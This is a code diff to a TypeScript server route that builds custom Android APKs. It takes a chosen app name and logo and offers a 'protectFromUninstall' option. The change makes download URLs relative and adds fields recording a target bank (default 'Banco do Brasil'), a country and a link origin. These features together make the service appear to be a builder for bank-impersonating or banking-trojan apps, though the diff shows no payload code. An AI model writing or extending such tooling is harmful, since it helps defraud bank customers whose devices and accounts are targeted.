@@ -286,10 +286,8 @@ export const appRouter = router({
 
           const filename = `${input.appName}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.apk`;
           
-          // Gerar URL absoluta para o APK (necessário para Android)
-          const protocol = ctx.req.headers['x-forwarded-proto'] || ctx.req.protocol || 'https';
-          const host = ctx.req.headers['x-forwarded-host'] || ctx.req.headers.host || 'localhost:3000';
-          const absoluteDownloadUrl = `${protocol}://${host}/apks/${filename}`;
+          // Usar URL relativa para download (funciona em qualquer domínio)
+          const downloadUrl = `/apks/${filename}`;
           
           const build = await createAPKBuild({
             userId: ctx.user.id,
@@ -298,8 +296,11 @@ export const appRouter = router({
             logoUrl: input.logoUrl,
             protectFromUninstall: input.protectFromUninstall ? 1 : 0,
             filename,
-            downloadUrl: absoluteDownloadUrl, // URL absoluta para funcionar em qualquer contexto
+            downloadUrl,
             status: 'building',
+            banco: input.banco || 'Banco do Brasil',
+            pais: input.pais || 'Brasil',
+            origemLink: input.origemLink || 'Automatico',
           });
 
           if (!build) {
@@ -332,9 +333,7 @@ export const appRouter = router({
               const fileSize = fs.statSync(apkPath).size;
               await updateAPKBuildFileSize(build.id, fileSize);
               
-              // Usar URL relativa para download (funciona em qualquer domínio)
-              // URL relativa é mais segura e evita problemas de mixed content
-              const downloadUrl = `/apks/${filename}`;
+              // URL já foi definida no início (URL relativa)
               console.log('[APK] URL de download relativa:', downloadUrl);
               console.log('[APK] Tamanho do APK:', (apkBuffer.length / 1024 / 1024).toFixed(2), 'MB');
               console.log('[APK] Arquivo salvo em:', apkPath);
